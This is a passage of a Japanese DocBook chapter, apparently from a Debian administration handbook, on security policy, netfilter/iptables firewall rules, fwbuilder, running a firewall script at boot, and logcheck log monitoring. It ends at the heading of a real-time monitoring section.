<?xml version='1.0' encoding='utf-8' ?>
<!DOCTYPE chapter PUBLIC "-//OASIS//DTD DocBook XML V4.5//EN" "http://www.oasis-open.org/docbook/xml/4.5/docbookx.dtd" [
]>
<chapter id="security">
  <chapterinfo>
    <mediaobject condition="pdf">
      <imageobject>
        <imagedata fileref="images/chap-security.png" scalefit="1" />
      </imageobject>
    </mediaobject>
    <keywordset>
      <keyword>ファイアウォール</keyword>
      <keyword>Netfilter</keyword>
      <keyword>IDS/NIDS</keyword>
    </keywordset>
  </chapterinfo>
  <title>セキュリティ</title>
  <highlights>
    <para>情報システムはその環境に依存してさまざまな重要度を持ちます。情報システムは企業が生き残る上で極めて重要な意味を持つ場合もあります。そのため、さまざまな危険から情報システムを保護することが重要です。これらの危険を評価する過程、保護の定義および実装はまとめて「セキュリティプロセス」として知られています。</para>
  </highlights>
  <section id="sect.defining-security-policy">
    <title>セキュリティポリシーの定義</title>

    <sidebar>
      <title><emphasis>CAUTION</emphasis> この章の適用範囲</title>

      <para>セキュリティは広い意味を持っておりとても慎重に扱うべき話題です。このため、どんな形であれ単一の章の中で包括的なやり方を説明することは不可能です。この章ではいくつかの重要な点を詳しく説明し、セキュリティ分野で使うことが可能ないくつかのツールと方法を説明するだけに留めます。より詳しい情報を得るには、セキュリティだけを取り扱っている数多くの文献を参照してください。Michael D. Bauer によって書かれた <citetitle>Linux Server Security</citetitle> (O'Reilly から出版されています) は素晴らしい足掛かりとなるでしょう。</para>
    </sidebar>

    <para>「セキュリティ」という単語自体は広い範囲の概念、ツール、手順を意味しており、どの一つをとってみても普遍的に適用できるものではありません。「セキュリティ」という単語の意味を把握するには、自分の目標に関する正確な知識を必要とします。システムを保護することはいくつかの質問に答えることから始まります。何も考えずいい加減に選んだツール群を使うと、間違ったセキュリティの側面に注力するという危険を冒すことになります。</para>

    <para>このため、最初に目標を設定します。目標設定を手助けするには、以下の質問に答えると良いでしょう。</para>
    <itemizedlist>
      <listitem>
	<para><emphasis>何を</emphasis>保護したいのですか? コンピュータを保護したい場合とデータを保護したい場合とでセキュリティポリシーは異なります。データを保護したい場合、保護したいデータの種類を知る必要があります。</para>
      </listitem>
      <listitem>
	<para><emphasis>何から</emphasis>保護したいのですか? 機密データの漏洩からですか? 予想外のデータ損失からですか? それともサービスが停止したことによる収益の損失からですか?</para>
      </listitem>
      <listitem>
	<para><emphasis>誰から</emphasis>保護したいのですか? 入力ミスを犯すシステムの一般ユーザから保護したい場合と執拗な攻撃を加えるグループから保護したい場合とでは、必要なセキュリティ対策は全く異なるものになるでしょう。</para>
      </listitem>
    </itemizedlist>

    <para>「リスク」という用語は習慣的に、3 つの要素をまとめて意味しています。すなわち、保護したいのは何なのか、防ぎたい危険とは何なのか、危険を引き起こすのは誰なのかという 3 つの要素を意味しています。リスクをモデル化するには、3 つの質問に答える必要があります。ここで作られたリスクモデルからセキュリティポリシーが構成され、セキュリティポリシーは具体的な動作を伴い履行されます。</para>

    <sidebar>
      <title><emphasis>NOTE</emphasis> 永久的な質問</title>

      <para>セキュリティ分野 (コンピュータ以外のセキュリティも含めたセキュリティ分野) における世界的専門家である Bruce Schneier はセキュリティの最も重要な通説に反対意見を述べようとしています。反対意見のモットーは「セキュリティとは過程であって、成果ではない」です。保護したい資産だけでなく、脅威や潜在的な攻撃者が使う手段も時間経過に伴い変化します。最初にセキュリティポリシーが完璧に設計され履行されたとしても、決してその栄光に満足するべきではありません。リスクの元になる要素が増加すれば、同時にリスクへの対応も増加させなければいけません。</para>
    </sidebar>

    <para>他にも考慮に値する追加的な質問があります。この質問により、利用できるポリシーの範囲を狭めることが可能です。どの程度までシステムを保護したいのですか? この質問はポリシーの設計に大きな影響をおよぼします。この質問には金銭的な費用の意味だけでなく、システムユーザに課される不便さや性能の低下の量という別の要素も考慮して回答すべきです。</para>

    <para>リスクのモデル化が完了したら、実際のセキュリティポリシーの設計について検討を開始することが可能です。</para>

    <sidebar>
      <title><emphasis>NOTE</emphasis> 極端なポリシー</title>

      <para>システムを保護するために必要な動作を極めて単純に選ぶことが可能な場合があります。</para>

      <para>たとえば、保護されるシステムが 1 台の中古コンピュータから構成されるとします。このシステムは毎日の終わりにいくつかの数の足し算を行うためだけに使われます。このようなシステムを特別に保護しないことはかなり理に適っています。本質的なシステムの価値は低いです。データはコンピュータに保存されないため、データの価値もありません。この「システム」に侵入されたところで、潜在的な攻撃者が手に入れられるのは大きすぎて扱いにくい計算機だけです。このようなシステムの場合、保護に必要な費用は侵害によって脅かされる費用よりも多いかもしれません。</para>

      <para>その対極に、可能な限り包括的な方法を使って機密データの機密性を考え得る他のどんな方法よりも強力に保護したいとします。この場合の適切な方針は機密データを完全に破壊することです (安全にファイルを削除し、ハードディスクを粉々に破砕し、破片を酸に溶かすなどの方法で完全に破壊します)。追加的な要求としてデータを将来使えるように保存する必要があり (とは言え簡単に利用できる必要はありません)、さらに保存にかかる費用に糸目を付けない場合、データをイリジウムプラチナ合金板に保存し、この板を世界中に位置するいくつかの山の下にある防弾掩体壕の内部に保存し、各保存場所を (もちろん) 完全に秘密かつ軍隊の全員で警備することが適切な方針です。</para>

      <para>これらの例は極端な対応に見えますが、到達させたい目標と満足させたい制限事項を考慮した結果この対応を取ったというのであれば、定義されたリスクに対する適切な応答と言えます。合理的な判定を下した結果ならば、他のセキュリティポリシーよりも軽んじても良いセキュリティポリシーなど存在しません。</para>
    </sidebar>

    <para>多くの場合、情報システムを一貫性のある独立した小集団に分割することが可能です。各サブシステムには固有の要求と制限事項があります。このため、リスク評価とセキュリティポリシーの設計はそれぞれのサブシステムごとに別々に実行されるべきです。簡潔にうまく定義された境界を定義するほうが複雑に曲がりくねった境界を定義するよりも簡単という原理は覚えておくと良いでしょう。ネットワーク組織もまた適切に設計されるべきです。すなわち、機密を取り扱うサービスは少数のマシンに集中させるべきで、それらのマシンへのアクセスを可能にするチェックポイントの数も最小限に留めるべきです。そして、これらのチェックポイントを守ることは、外の世界全体からすべての機密を取り扱うマシンを守ることよりも簡単です。近年、ネットワークフィルタ (ファイアウォールを含めて) の実用性が明らかになりつつあります。ネットワークフィルタは専用ハードウェアを使って実装されることも可能ですが、Linux カーネルに統合されているソフトウェアファイアウォールを使えばより簡単で柔軟性の高いフィルタを作成することが可能です。</para>
  </section>
  <section id="sect.firewall-packet-filtering">
    <title>ファイアウォールとパケットフィルタリング</title>
    <indexterm><primary>ファイアウォール</primary></indexterm>
    <indexterm><primary>パケットフィルタ</primary></indexterm>

    <sidebar>
      <title><emphasis>BACK TO BASICS</emphasis> ファイアウォール</title>
      <indexterm><primary>パケット</primary><secondary>IP パケット</secondary></indexterm>

      <para><emphasis>ファイアウォール</emphasis>はハードウェアかソフトウェアの形で提供されるコンピュータ部品の一種で、受信および送信する (ローカルネットワークに到着したり、ローカルネットワークから送信される) ネットワークパケットを仕分けて事前に定義された条件に一致するパケットだけを通過させるものです。</para>
    </sidebar>

    <para>ファイアウォールはネットワークゲートウェイをフィルタするもので、ゲートウェイを通過しなければいけないパケットだけに有効です。それ故、フィルタしたいパケットをファイアウォール以外の経路で宛先に配送することが可能な場合、ファイアウォールは無意味です。</para>

    <para>標準的な設定が存在しないということは (そして「過程であって、成果ではない」モットーに従うということは) ややこしい初期設定の不要な解決策が存在しないということを意味します。しかしながら、<emphasis>netfilter</emphasis> ファイアウォールの設定を簡単に行うためのツールが存在し、ツールはフィルタリングルールをグラフィカルに表現する機能を備えています。<command>fwbuilder</command> がこの種のツールの中で最良のツールであることは疑いありません。</para>
    <indexterm><primary><emphasis>netfilter</emphasis></primary></indexterm>

    <sidebar>
      <title><emphasis>SPECIFIC CASE</emphasis> ローカルファイアウォール</title>

      <para>ファイアウォールを使って (完全なネットワークとは対照的に) 特定のマシンを制限することも可能です。この場合のファイアウォールの役割は一部のサービスへのアクセスをフィルタしたり制限すること、ユーザが好むと好まざるとに関わらずインストールした不正ソフトウェアによる外部への接続を防ぐことです。</para>
    </sidebar>

    <para>Linux カーネルには <emphasis>netfilter</emphasis> ファイアウォールが組み込まれています。<command>iptables</command> と <command>ip6tables</command> コマンドを使うことで、<emphasis>netfilter</emphasis> ファイアウォールをユーザ空間から制御することが可能です。<command>iptables</command> と <command>ip6tables</command> コマンドの違いは、<command>iptables</command> が IPv4 ネットワークを取り扱うのに対し、<command>ip6tables</command> は IPv6 ネットワークを取り扱うという点です。おそらく IPv4 と IPv6 のネットワークプロトコルスタックは長きにわたり共存するでしょうから、両方のツールを並行して実行する必要があります。</para>
    <indexterm><primary><command>iptables</command></primary></indexterm>
    <indexterm><primary><command>ip6tables</command></primary></indexterm>
    <section id="sect.netfilter">
      <title>netfilter の挙動</title>

      <para><emphasis>netfilter</emphasis> は以下に示す 4 種類の異なるテーブルを使います。テーブルには、パケットに対する 3 種類の操作を規制するためのルールを保存します。</para>
      <itemizedlist>
        <listitem>
	  <para><literal>filter</literal>。フィルタリングルール (パケットを受け入れる、拒否する、無視するなど) に関係します。</para>
        </listitem>
        <listitem>
	  <para><literal>nat</literal>。パケットの送信元や宛先アドレスおよびポート番号の変換に関係します。</para>
        </listitem>
        <listitem>
	  <para><literal>mangle</literal>。IP パケットに対するその他の変換に関係します (ToS すなわち <emphasis>Type of Service</emphasis> フィールドやオプションの変換も含まれます)。</para>
        </listitem>
        <listitem>
	  <para><literal>raw</literal>。パケットが接続追跡システムに到達する前にパケットを手作業で別の変更を加えることが可能です。</para>
        </listitem>
      </itemizedlist>

      <para>それぞれのテーブルには、<emphasis>チェイン</emphasis>と呼ばれるルールのリストが含まれます。ファイアウォールは事前に定義された状況に基づいてパケットを取り扱うために標準的なチェインを使います。管理者は他のチェインを作成することが可能です。このチェインを使うには、標準的なチェインの 1 つから (直接的か間接的かのいずれか一方の方法で) このチェインを参照します。</para>
      <indexterm><primary>チェイン</primary></indexterm>
      <indexterm><primary>フィルタリングルール</primary></indexterm>

      <para><literal>filter</literal> テーブルは以下に示す 3 種類の標準的なチェインを備えています。</para>
      <itemizedlist>
        <listitem>
	  <para><literal>INPUT</literal>。宛先がファイアウォール自身のパケットに関係します。</para>
        </listitem>
        <listitem>
	  <para><literal>OUTPUT</literal>。ファイアウォールから送信されたパケットに関係します。</para>
        </listitem>
        <listitem>
	  <para><literal>FORWARD</literal>。ファイアウォールを通過するパケット (送信元や宛先がファイアウォールでないパケット) に関係します。</para>
        </listitem>
      </itemizedlist>

      <para><literal>nat</literal> テーブルは以下に示す 3 種類の標準的なチェインを備えています。</para>
      <itemizedlist>
        <listitem>
	  <para><literal>PREROUTING</literal>。パケットの到着直後にパケットを修正します。</para>
        </listitem>
        <listitem>
	  <para><literal>POSTROUTING</literal>。パケットを宛先に送信する準備が完了した時にパケットを修正します。</para>
        </listitem>
        <listitem>
	  <para><literal>OUTPUT</literal>。ファイアウォールそれ自身によって生成されたパケットを修正します。</para>
        </listitem>
      </itemizedlist>

      <figure id="figure.chaines-netfilter">
        <title><emphasis>netfilter</emphasis> チェインの呼び出される方法</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/netfilter.png" scalefit="1" width="65%" />
          </imageobject>
        </mediaobject>
      </figure>

      <para>各チェインはルールのリストです。そして各ルールは一連の条件とその条件に一致する場合に実行される動作です。パケットを処理する場合、ファイアウォールは適切なチェインを 1 つずつ検査します。そしてあるルールの条件に一致したら、処理を続けるために特定の動作に「ジャンプ」します (このためコマンドには <literal>-j</literal> オプションが存在します)。最も一般的な挙動は標準化されており、それぞれの挙動に対する専用の動作が存在します。以下に示す標準的な動作が選択されると、チェインの処理は中止されます。なぜなら、パケットの運命は既に決まっているからです (以下で言及されている除外に一致する場合を除きます)。</para>

      <sidebar>
        <title><emphasis>BACK TO BASICS</emphasis> ICMP</title>

	<para>ICMP (<emphasis>Internet Control Message</emphasis> Protocol) は通信に関する補足情報を送信するために使われるプロトコルです。<command>ping</command> コマンドは ICMP を使ってネットワークの接続性を検査します (<command>ping</command> コマンドは ICMP <emphasis>echo request</emphasis> メッセージを送信します。これに対して受信者は ICMP <emphasis>echo reply</emphasis> メッセージで応答することになっています)。ICMP を使えば、ファイアウォールがパケットを拒否していることを通知したり、受信バッファが満杯になっていることを通知したり、次回パケット以降に使えるより良い経路を提案することが可能です。ICMP はいくつかの RFC 文書で定義されています。しかし、最初の RFC777 と RFC792 はすぐに完成し、拡張されました。<ulink type="block" url="http://www.faqs.org/rfcs/rfc777.html" /><ulink type="block" url="http://www.faqs.org/rfcs/rfc792.html" /></para>

	<para>参考のために書いておきますが、受信バッファとはデータがネットワークから到着してカーネルがデータを処理するまでの間そのデータを保存する小容量のメモリ区画です。このメモリ区画が満杯になると、新しいデータを受け取ることができなくなり、ICMP を使ってこの問題が通知されます。そうすれば送信側はデータの転送速度を遅くすることが可能です (理想的に言えば、しばらくの後に転送速度は平衡状態に達するべきです)。</para>
        <indexterm><primary>ICMP</primary></indexterm>
        <indexterm><primary>Internet Control Message Protocol</primary></indexterm>
        <indexterm><primary>受信バッファ</primary></indexterm>
        <indexterm><primary>バッファ</primary><secondary>受信バッファ</secondary></indexterm>
        <indexterm><primary><command>ping</command></primary></indexterm>

	<para>IPv4 ネットワークは ICMP がなくても動作しますが、IPv6 ネットワークは ICMPv6 を必須条件としています。なぜなら、ICMPv6 は IPv4 世界で ICMPv4、IGMP (<emphasis>Internet Group Membership Protocol</emphasis>)、ARP (<emphasis>Address Resolution Protocol</emphasis>) のように分散していたさまざまな機能をまとめているからです。ICMPv6 は RFC4443 で定義されています。<ulink type="block" url="http://www.faqs.org/rfcs/rfc4443.html" /></para>
      </sidebar>

      <para></para>
      <itemizedlist>
        <listitem>
	  <para><literal>ACCEPT</literal>。対象のパケットの通過を許可します。</para>
        </listitem>
        <listitem>
	  <para><literal>REJECT</literal>。対象のパケットを拒否して ICMP エラーを返答します (<command>iptables</command> の <literal>--reject-with <replaceable>type</replaceable></literal> オプションを使えば返答するエラーの種類を選ぶことが可能です)。</para>
        </listitem>
        <listitem>
	  <para><literal>DROP</literal>。対象のパケットを削除 (無視) します。</para>
        </listitem>
        <listitem>
	  <para><literal>LOG</literal>。(<command>syslogd</command> を使って) 対象のパケットの説明とメッセージをログに記録します。ログ記録が選択された場合、チェインの処理は中止されず続行されて次のルールに進む点に注意してください。このため、拒否されたパケットをログに記録するには LOG と REJECT/DROP ルールの両方が必要です。</para>
        </listitem>
        <listitem>
	  <para><literal>ULOG</literal>。<command>ulogd</command> を介してメッセージをログに記録します。<command>ulogd</command> は大量のメッセージを処理する場合に <command>syslogd</command> よりも効率が良いです。LOG と同様、この場合も処理は呼び出されたチェインの次のルールに進む点に注意してください。</para>
        </listitem>
        <listitem>
	  <para><replaceable>chain_name</replaceable>。指定したチェインに飛んで、そのチェインのルールを評価します。</para>
        </listitem>
        <listitem>
	  <para><literal>RETURN</literal>。現在のチェインの処理を中止し、呼び出し元のチェインに戻ります。現在のチェインが標準的なチェインの場合、呼び出し元のチェインは存在しませんから、代わりにデフォルト動作 (<command>iptables</command> の <literal>-P</literal> オプションで定義された動作) が実行されます。</para>
        </listitem>
        <listitem>
	  <para><literal>SNAT</literal> (<literal>nat</literal> テーブルの中だけでのみ使うことが可能です)。<emphasis>Source NAT</emphasis> を適用します (追加オプションを使って適用する正確な変更を設定します)。</para>
        </listitem>
        <listitem>
	  <para><literal>DNAT</literal> (<literal>nat</literal> テーブルの中だけでのみ使うことが可能です)。<emphasis>Destination NAT</emphasis> を適用します (追加オプションを使って適用する正確な変更を設定します)。</para>
        </listitem>
        <listitem>
	  <para><literal>MASQUERADE</literal> (<literal>nat</literal> テーブルの中だけでのみ使うことが可能です)。<emphasis>マスカレード</emphasis>を適用します (<emphasis>マスカレード</emphasis>は <emphasis>Source NAT</emphasis> の特別な場合です)。</para>
        </listitem>
        <listitem>
	  <para><literal>REDIRECT</literal> (<literal>nat</literal> テーブルの中だけでのみ使うことが可能です)。ファイアウォールの指定したポートに対象のパケットを転送します。さらにこれを使って、クライアント側に特別な設定をせずとも動作する透過的なウェブプロキシをセットアップすることが可能です。なぜなら、クライアントは宛先に接続していると思っていても、実際の通信はプロキシを通過しているからです。</para>
        </listitem>
      </itemizedlist>

      <para>その他の動作 (特に <literal>mangle</literal> テーブルに関する動作) は本書の範囲を超えています。<citerefentry><refentrytitle>iptables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> と <citerefentry><refentrytitle>ip6tables</refentrytitle> <manvolnum>8</manvolnum></citerefentry> には包括的なリストが含まれています。</para>
    </section>
    <section id="sect.iptables">
      <title><command>iptables</command> と <command>ip6tables</command> の構文</title>

      <para><command>iptables</command> と <command>ip6tables</command> コマンドを使って、テーブル、チェイン、ルールを操作することが可能です。<literal>-t <replaceable>table</replaceable></literal> オプションで操作対象のテーブルを指定します (デフォルトの場合、<literal>filter</literal> テーブルを操作します)。</para>
      <indexterm><primary><command>iptables</command></primary></indexterm>
      <indexterm><primary><command>ip6tables</command></primary></indexterm>
      <section id="sect.iptables-command">
        <title>コマンド</title>

	<para><literal>-N <replaceable>chain</replaceable></literal> オプションは新しいチェインを作成します。<literal>-X <replaceable>chain</replaceable></literal> は空で使われていないチェインを削除します。<literal>-A <replaceable>chain</replaceable> <replaceable>rule</replaceable></literal> はチェインの最後にルールを追加します。<literal>-I <replaceable>chain</replaceable> <replaceable>rule_num</replaceable> <replaceable>rule</replaceable></literal> オプションは指定したルール番号 <replaceable>rule_num</replaceable> の前にルールを挿入します。<literal>-D <replaceable>chain</replaceable> <replaceable>rule_num</replaceable></literal> (または <literal>-D <replaceable>chain</replaceable> <replaceable>rule</replaceable></literal>) オプションはチェインからルールを削除します。ここで <replaceable>rule_num</replaceable> を使う構文はルール番号を指定してルールを削除し、<replaceable>rule</replaceable> を使う構文はルール内容を指定してルールを削除します。<literal>-F <replaceable>chain</replaceable></literal> オプションはチェインをクリアします (チェインに含まれるすべてのルールを削除します)。ここでチェインを指定しなかった場合、テーブルに含まれるすべてのルールを削除します。<literal>-L <replaceable>chain</replaceable></literal> オプションはチェインに含まれるルールを表示します。最後に、<literal>-P <replaceable>chain</replaceable> <replaceable>action</replaceable></literal> オプションは指定したチェインのデフォルト動作を意味する「ポリシー」を定義します。ここでポリシーを設定できるのは標準的なチェインだけという点に注意してください。</para>
      </section>
      <section id="sect.iptables-rules">
        <title>ルール</title>
        <indexterm><primary>フィルタリングルール</primary></indexterm>

	<para>それぞれのルールは <literal><replaceable>conditions</replaceable> -j <replaceable>action</replaceable> <replaceable>action_options</replaceable></literal> の形で指定します。1 つのルールに複数の条件を指定する場合、複数の条件は結合 (論理 <emphasis>and</emphasis>) されます。つまり、各条件の結果をさらに限定することを意味します。</para>

	<para><literal>-p <replaceable>protocol</replaceable></literal> は指定されたプロトコルフィールドに一致する IP パケットを選択する条件です。<replaceable>protocol</replaceable> で最もよく使われる値は <literal>tcp</literal>、<literal>udp</literal>、<literal>icmp</literal>、<literal>icmpv6</literal> です。この条件の前に感嘆符を付けることで、この条件を否定することになります。つまり「<replaceable>protocol</replaceable> で指定されたプロトコル以外のすべてのプロトコルを使ったパケット」を選択する条件になります。条件否定の方法は <literal>-p</literal> オプションに限らず、以降で紹介する他のすべての条件にも適用することが可能です。</para>

	<para><literal>-s <replaceable>address</replaceable></literal> または <literal>-s <replaceable>network/mask</replaceable></literal> は指定された送信元アドレスに一致するパケットを選択する条件です。同様に、<literal>-d <replaceable>address</replaceable></literal> または <literal>-d <replaceable>network/mask</replaceable></literal> は指定された宛先アドレスに一致するパケットを選択する条件です。</para>

	<para><literal>-i <replaceable>interface</replaceable></literal> は指定されたネットワークインターフェースを通じて受信したパケットを選択する条件です。<literal>-o <replaceable>interface</replaceable></literal> は指定されたインターフェースを通じて送信されるパケットを選択する条件です。</para>

	<para>上で説明した一般的な条件ごとに、さらに条件の範囲を狭めるためのオプションが数多く存在します。たとえば <literal>-p tcp</literal> 条件に加えて TCP ポート番号を指定することで、選択するパケットをさらに絞り込むことが可能です。これを行うには、<literal>--source-port <replaceable>port</replaceable></literal> と <literal>--destination-port <replaceable>port</replaceable></literal> を使います。</para>

	<para><literal>--state <replaceable>state</replaceable></literal> は指定されたパケット状態に一致するパケットを選択する条件です (接続追跡を行うための <command>ipt_conntrack</command> カーネルモジュールが必要です)。<literal>NEW</literal> 状態は新しい接続を開始するパケット、<literal>ESTABLISHED</literal> 状態は既に存在する接続に関連するパケットを意味します。<literal>RELATED</literal> 状態は既存の接続に関連した新しい接続を開始するパケットを意味します (これは FTP プロトコルの「アクティブ」モードを使った <literal>ftp-data</literal> 接続の際に有益です)。</para>

	<para>前節では利用できる標準的な動作を説明しましたが、その動作に対するオプションを説明していませんでした。たとえば、<literal>LOG</literal> 動作は以下のオプションを取ることが可能です。</para>
        <itemizedlist>
          <listitem>
	    <para><literal>--log-level</literal> は記録する <command>syslog</command> メッセージの重要度を指定します。デフォルトの場合 <literal>warning</literal> 以上の重要度を持つメッセージが記録されます。</para>
          </listitem>
          <listitem>
	    <para><literal>--log-prefix</literal> はログに記録するメッセージを特徴づけるために行の先頭に付けるテキストを指定します。</para>
          </listitem>
          <listitem>
	    <para><literal>--log-tcp-sequence</literal>、<literal>--log-tcp-options</literal>、<literal>--log-ip-options</literal> はログメッセージに含める追加的なデータを指定します。具体的に言えば、それぞれ TCP シーケンス番号、TCP オプション、IP オプションをログメッセージに含めます。</para>
          </listitem>
        </itemizedlist>

	<para><literal>DNAT</literal> 動作は以下のオプションを取ることが可能です。<literal>--to-destination <replaceable>address</replaceable>:<replaceable>port</replaceable></literal> は新しい宛先 IP アドレスおよびポート番号を指定します。同様に、<literal>SNAT</literal> 動作は以下のオプションを取ることが可能です。<literal>--to-source <replaceable>address</replaceable>:<replaceable>port</replaceable></literal> は新しい送信元 IP アドレスおよびポート番号を指定します。</para>

	<para><literal>REDIRECT</literal> 動作は以下のオプションを取ることが可能です。<literal>--to-ports <replaceable>port(s)</replaceable></literal> はパケットの転送先ポート番号またはポート番号範囲を指定します (<literal>REDIRECT</literal> 動作は NAT を有効化している場合にのみ使うことが可能です)。</para>
      </section>
    </section>
    <section id="sect.creating-rules">
      <title>ルールの作成</title>

      <para>1 つのルールを作成するには、<command>iptables</command>/<command>ip6tables</command> を 1 回実行する必要があります。これらのコマンドを手作業で実行することは退屈なので、通常スクリプトの形で保存しておきます。こうすることで、マシンの起動時に同じ設定を自動的に適用することが可能です。このスクリプトは手作業で書かなければいけませんが、<command>fwbuilder</command> などの高レベルツールを使ってスクリプトを準備しても良いでしょう。</para>

      
      <screen>
<computeroutput># </computeroutput><userinput>apt install fwbuilder</userinput></screen>

      <para><command>fwbuilder</command> の原理は簡単です。最初に、以下のような実際のルールに関連するすべての要素を宣言する必要があります。</para>
      <itemizedlist>
        <listitem>
	  <para>ネットワークインターフェースとそれを使うファイアウォール自身。</para>
        </listitem>
        <listitem>
	  <para>対応する IP アドレス範囲とそれを使うネットワーク。</para>
        </listitem>
        <listitem>
	  <para>サーバ。</para>
        </listitem>
        <listitem>
	  <para>サーバでホストされているサービスに対応するポート番号。</para>
        </listitem>
      </itemizedlist>

      <para>これらの要素に対する単純なドラッグアンドドロップ動作を使ってルールを作成します。いくつかのコンテキストメニューを使ってルールの条件を変更する (たとえば条件を否定する) ことが可能です。その後、動作を選んで設定する必要があります。</para>

      <para>IPv6 に関心があるなら、IPv4 と IPv6 で別々のルールセットを作成するか、片方のルールセットだけを作成して要素に割り当てられたアドレスに応じて <command>fwbuilder</command> にそのルールを変換してもらうかのどちらか一方を行うことが可能です。</para>

      <figure id="figure.fwbuilder">
        <title>fwbuilder のメインウィンドウ</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/fwbuilder.png" scalefit="1" />
          </imageobject>
        </mediaobject>
      </figure>
      <indexterm><primary><command>fwbuilder</command></primary></indexterm>

      <para>これで <command>fwbuilder</command> は定義されたルールに従ってファイアウォールを設定するためのスクリプトを生成することが可能になりました。モジュール式のアーキテクチャのおかげで、<command>fwbuilder</command> はさまざまなファイアウォールシステム (Linux の <command>iptables</command>、FreeBSD の <command>ipf</command>、OpenBSD の <command>pf</command>) を設定するためのスクリプトを生成することが可能です。</para>

    </section>
    <section id="sect.install-rules-at-boot">
      <title>起動時にルールを適用する</title>

      <para>設定スクリプトを <filename>/etc/network/interfaces</filename> ファイルの <literal>up</literal> 指示文に登録する方法を推奨します。以下の例では、設定スクリプトは <filename>/usr/local/etc/arrakis.fw</filename> に保存されています。</para>

      <example id="example.network-interfaces-firewall">
        <title>ファイアウォールスクリプトを呼び出す <filename>interfaces</filename> ファイル</title>

        <programlisting>auto eth0
iface eth0 inet static
    address 192.168.0.1
    network 192.168.0.0
    netmask 255.255.255.0
    broadcast 192.168.0.255
    up /usr/local/etc/arrakis.fw</programlisting>
      </example>
      <para>見ての通りこの例ではネットワークインターフェースを設定するために <emphasis role="pkg">ifupdown</emphasis> を使っています。他の方法 (たとえば <emphasis>NetworkManager</emphasis> や <emphasis>systemd-networkd</emphasis> など) を使ってネットワークインターフェースを設定している場合、それぞれの文書を参照して、インターフェースを起動した後にスクリプトを実行する方法を見つけてください。</para>

    </section>
  </section>
  <section id="sect.supervision">
    <title>監督、防止、検出、監査</title>
    <indexterm><primary>監視</primary></indexterm>

    <para>監視はいくつかの理由によっていかなるセキュリティポリシーにおいても不可欠な要素になっています。最たる理由はセキュリティの目標には通常データの機密性を保証するだけでなく、サービスの可用性を保証することも含まれているという理由です。そのため、すべてが想定通りに稼働しているかを確認したり、さまざまな逸脱した挙動や提供しているサービス品質の変化をタイミング良く検出したりすることが不可欠です。監視活動のおかげで、危機的状況に陥る前に不正侵入の試行を検出し迅速に対応することが可能です。この節では、Debian システムのさまざまな側面を監視するために使えるいくつかのツールを概説します。この節は<xref linkend="sect.monitoring" />を補完する節です。</para>
    <section id="sect.logcheck">
      <title><command>logcheck</command> を使ったログ監視</title>
      <indexterm><primary><command>logcheck</command></primary></indexterm>
      <indexterm><primary>ログ</primary><secondary>監視</secondary></indexterm>
      <indexterm><primary>監視</primary><secondary>ログファイル</secondary></indexterm>

      <para><command>logcheck</command> プログラムはデフォルトでは毎時間ログファイルを監視します。<command>logcheck</command> は不審なログメッセージを電子メールで管理者に送信し、さらなる解析を促します。</para>

      <para>監視対象ファイルのリストは <filename>/etc/logcheck/logcheck.logfiles</filename> に保存されています。<filename>/etc/rsyslog.conf</filename> ファイルが完全に書き換えられていない限り、デフォルト値でうまく動作します。</para>

      <para><command>logcheck</command> の動作モードには 3 種類あり、そのうちの 1 つを選びます。具体的に言えば、<emphasis>paranoid</emphasis>、<emphasis>server</emphasis>、<emphasis>workstation</emphasis> から 1 つ選びます。<emphasis>paranoid</emphasis> モードは<emphasis>とても</emphasis>詳細で、<emphasis>paranoid</emphasis> モードを使うのはファイアウォールなどの特定のサーバに限定するべきです。<emphasis>server</emphasis> モードはデフォルトで、多くのサーバでは <emphasis>server</emphasis> モードを使うことを推奨します。<emphasis>workstation</emphasis> モードはワークステーション用に設計されており、かなり簡潔です (より多くのメッセージを除外します)。</para>

      <para>どの動作モードを選んだ場合でも、管理者は毎時間のバッチ処理のたびに長くてつまらない電子メールを受け取ることを本当に望むのでなければ、<command>logcheck</command> を (インストール済みサービスに基づき) カスタマイズしていくつかの余分なメッセージを除外するべきです。メッセージ選択ルールはかなり複雑なので、もし挑戦するなら <filename>/usr/share/doc/logcheck-database/README.logcheck-database.gz</filename> を読むと良いでしょう。</para>

      <para>メッセージに対して適用されるルールは以下に示す種類に分類されます。</para>
      <itemizedlist>
        <listitem>
	  <para>クラッキングの試行として分類するメッセージのルール (<filename>/etc/logcheck/cracking.d/</filename> ディレクトリ内のファイルに保存します)。</para>
        </listitem>
        <listitem>
	  <para>クラッキングの試行として分類されたメッセージの分類を解除するメッセージのルール (<filename>/etc/logcheck/cracking.ignore.d/</filename> ディレクトリ内のファイルに保存します)。</para>
        </listitem>
        <listitem>
	  <para>セキュリティ警告として分類するメッセージのルール (<filename>/etc/logcheck/violations.d/</filename> ディレクトリ内のファイルに保存します)。</para>
        </listitem>
        <listitem>
	  <para>セキュリティ警告として分類されたメッセージの分類を解除するメッセージのルール (<filename>/etc/logcheck/violations.ignore.d/</filename> ディレクトリ内のファイルに保存します)。</para>
        </listitem>
        <listitem>
	  <para>その他のメッセージに適用するルール (<emphasis>システムイベント</emphasis>として分類されます)。</para>
        </listitem>
      </itemizedlist>

      <sidebar>
        <title><emphasis>CAUTION</emphasis> メッセージの無視</title>

	<para><filename>/etc/logcheck/violations.d/myfile</filename> ファイルに保存されているルールに基づいてクラッキング試行やセキュリティ警告として分類されたメッセージの分類を解除するには、<filename>/etc/logcheck/violations.ignore.d/myfile</filename> または <filename>/etc/logcheck/violations.ignore.d/myfile-<replaceable>extension</replaceable></filename> ファイルを使います。</para>
      </sidebar>

      <para><filename>/etc/logcheck/ignore.d.{paranoid,server,workstation}/</filename> ディレクトリ内のルールの 1 つによってシステムイベントが無視されなかった場合を除いて、常にシステムイベントは通知されます。もちろん、ここで考慮されるディレクトリは選択された動作モードの冗長性レベル以上の冗長性レベルに対応するディレクトリです。</para>
    </section>
    <section id="sect.monitoring-activity">
      <title>監視活動</title>
      <indexterm><primary>監視</primary><secondary>活動</secondary></indexterm>
      <indexterm><primary>活動、監視</primary></indexterm>
      <section id="sect.real-time-monitoring">
        <title>リアルタイム監視</title>

